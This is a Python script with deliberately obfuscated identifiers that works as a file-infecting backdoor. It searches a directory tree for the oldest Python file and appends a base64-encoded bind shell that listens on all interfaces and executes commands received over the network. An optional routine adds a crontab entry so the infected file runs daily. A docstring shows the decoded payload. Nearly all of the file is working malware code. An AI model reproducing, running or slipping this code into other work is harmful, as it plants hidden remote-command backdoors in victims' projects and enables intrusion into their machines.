#!/usr/bin/env python3
from os.path import expanduser
from os import walk, stat
from sys import path
from glob import glob
from platform import system
from base64 import b64encode, b64decode
from subprocess import run, PIPE
from datetime import datetime


class eHhjemR5eXB:
    def __init__(self, cHlkYWNhZWFpa):
        self.cHlkYWNhZWFpa = cHlkYWNhZWFpa
        self.bGpqZ2hjen = system()
        self.aWFmYXRye = "0.0.0.0"
        self.ZmFsa2p0aGM = 0x401
        self.Z2hhenh4ZGwK = None
        "asd".encode()

    def dGVyeXB6Y2FjeH(self, dGR6eGFteXBxC):
        '''
        from socket import socket, AF_INET, SOCK_STREAM
        from subprocess import run, PIPE
        def serve():
            with socket(AF_INET, SOCK_STREAM) as soc:
                # [*] The obfuscated values are just the IP address and port to bind to
                soc.bind((ip, 端口))
                soc.listen(5)
                while True:
                    try:
                        conn, _ = soc.accept()
                        while True:
                            cmd = conn.recv(1024).decode("utf-8").strip()
                            try:
                                cmd_output = run(cmd.split(), stdout=PIPE, stderr=PIPE)
                            except Exception as e:
                                conn.send((str(e)+"""\n""").encode("utf-8"))
                                continue
                            if cmd_output.returncode == 0:
                                conn.send(bytes(cmd_output.stdout))
                            else:
                                continue
                    except Exception as e:
                        print(e)
        serve()
        '''
        YWxmanRob = b"from socket import socket, AF_INET, SOCK_STREAM"
        YWxmanRob += b"\nfrom subprocess import run, PIPE"
        YWxmanRob += b"\ndef serve():"
        YWxmanRob += b"\n\twith socket(AF_INET, SOCK_STREAM) as soc:"
        YWxmanRob += bytes(
            f'\n\t\tsoc.bind(("{self.aWFmYXRye}", {self.ZmFsa2p0aGM}))', "utf-8"
        )
        YWxmanRob += b"\n\t\tsoc.listen(5)"
        YWxmanRob += b"\n\t\twhile True:"
        YWxmanRob += b"\n\t\t\ttry:"
        YWxmanRob += b"\n\t\t\t\tconn, _ = soc.accept()"
        YWxmanRob += b"\n\t\t\t\twhile True:"
        YWxmanRob += b'\n\t\t\t\t\tcmd = conn.recv(1024).decode("utf-8").strip()'
        YWxmanRob += b"\n\t\t\t\t\ttry:"
        YWxmanRob += b"\n\t\t\t\t\t\tcmd_ls = cmd.split()"
        YWxmanRob += (
            b"\n\t\t\t\t\t\tcmd_output = run(cmd_ls, stdout=PIPE, stderr=PIPE)"
        )
        YWxmanRob += b"\n\t\t\t\t\texcept Exception as e:"
        YWxmanRob += b'\n\t\t\t\t\t\tconn.send((str(e)+"""\n""").encode("utf-8"))'
        YWxmanRob += b"\n\t\t\t\t\t\tcontinue"
        YWxmanRob += b"\n\t\t\t\t\tif cmd_output.returncode == 0:"
        YWxmanRob += b"\n\t\t\t\t\t\tconn.send(bytes(cmd_output.stdout))"
        YWxmanRob += b"\n\t\t\t\t\telse: continue"
        YWxmanRob += b"\n\t\t\texcept Exception as e:"
        YWxmanRob += b"\n\t\t\t\tprint(e)"
        YWxmanRob += b"\nserve()"

        YWxmanRob_base64 = b64encode(YWxmanRob)
        cXBxZXJjYQ = "\n" * 0x2 + "from subprocess import run\n"
        cXBxZXJjYQ += 'run("""python3 -c "from binascii import a2b_base64;'
        cXBxZXJjYQ += 'exec(a2b_base64(\'{}\'))" &""",shell=True)'.format(
            YWxmanRob_base64.decode()
        )

        with open(dGR6eGFteXBxC, "a") as f:
            f.write(cXBxZXJjYQ)
        self.ZmFsa2p0aGM += 1

    def MTRkYmNubWx(self):
        YWJyZmFm = "/" if self.bGpqZ2hjen == "Linux" else "\\"
        for Z3Jvb3RhbGZq, _, _ in walk(self.cHlkYWNhZWFpa):
            for f in glob(Z3Jvb3RhbGZq + YWJyZmFm + "*.py"):
                if f == Z3Jvb3RhbGZq + YWJyZmFm + __file__:
                    continue
                eHhtbG1vZGF0 = stat(f).st_mtime
                ZHRmbGNhbW9k = datetime.fromtimestamp(eHhtbG1vZGF0)
                if not self.Z2hhenh4ZGwK:
                    self.Z2hhenh4ZGwK = (f, ZHRmbGNhbW9k)
                elif ZHRmbGNhbW9k < self.Z2hhenh4ZGwK[1]:
                    self.Z2hhenh4ZGwK = (f, ZHRmbGNhbW9k)
        self.dGVyeXB6Y2FjeH(self.Z2hhenh4ZGwK[0])

    def YWZhdGhjCg(self):
        if self.bGpqZ2hjen == "Linux":
            run(f"echo '37 13 * * * {self.Z2hhenh4ZGwK[0]}' | crontab -", shell=True)


if __name__ == "__main__":
    # For traversing the user's home directory
    # aGdsZGFx = expanduser('~')
    # YmNjLGFka2x = eHhjemR5eXB(aGdsZGFx)
    YmNjLGFka2x = eHhjemR5eXB("./test")
    YmNjLGFka2x.MTRkYmNubWx()
    # YmNjLGFka2x.YWZhdGhjCg()
